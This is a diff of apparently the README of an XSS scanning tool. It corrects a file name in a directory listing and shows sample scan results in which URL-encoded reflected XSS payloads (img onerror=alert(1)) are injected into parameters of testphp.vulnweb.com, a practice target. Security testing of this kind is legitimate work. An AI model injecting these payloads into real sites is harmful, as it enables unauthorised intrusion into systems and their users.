@@ -42,9 +42,11 @@ Buscando por XSS FOUND concluído com sucesso.
 Busca concluída.
 
 #ls
-enddpoint.txt  host.txt  possible_xss.txt  resultado.txt  subdomains.txt  xss_fuzz.txt
+
+endpoint.txt  host.txt  possible_xss.txt  resultado.txt  subdomains.txt  xss_fuzz.txt
 
 #cat resultado.txt
+
 XSS FOUND: http://testphp.vulnweb.com/showimage.php?file=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22
  XSS FOUND: http://testphp.vulnweb.com:80/hpp/index.php?pp=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22
  XSS FOUND: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22&p=%22>
